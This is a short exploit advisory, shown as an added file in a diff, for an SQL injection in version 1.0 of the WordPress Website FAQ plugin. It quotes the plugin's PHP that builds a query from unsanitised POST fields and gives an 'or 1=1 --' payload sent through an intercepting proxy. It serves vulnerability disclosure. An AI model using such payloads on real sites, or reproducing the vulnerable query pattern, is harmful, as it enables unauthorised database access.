@@ -1,0 +1,34 @@
+# Exploit Title: WordPress Website FAQ Plugin v1.0 SQL Injection
+# Date: 6/25/12
+# Exploit Author: Chris Kellum
+# Vendor Homepage: http://wordpress.org/extend/plugins/website-faq/
+# Software Link: http://downloads.wordpress.org/plugin/website-faq.zip
+# Version: 1.0
+
+
+==============================================================================
+Vulnerability location: /wp-content/plugins/website-faq/website-faq-widget.php
+==============================================================================
+
+     Lines 106-115:
+
+          function displayAnswer()
+          {
+ 	     global $wpdb;
+             $master_table = $wpdb->prefix . "faq";
+	     $category = $_POST['category'];
+	     $searchtxt = $_POST['searchtxt'];
+	     if($category!=0)
+	     {
+	        $sql = "SELECT * FROM $master_table WHERE faq_category=".$category." AND  faq_question LIKE '%".$searchtxt."%'";
+	     }
+
+===============================================================
+Vulnerability Details: faq_category vulnerable to SQL injection
+===============================================================
+
+When submitting a query via the widget, intercept the post request via burp or other proxy to find the following:
+
+              action=displayAnswer&category=1&searchtxt=[your query]
+
+Changing category=1 to category=1 or 1=1 -- exposes the vulnerability, as it returns all FAQ results regardless of searchtxt value.
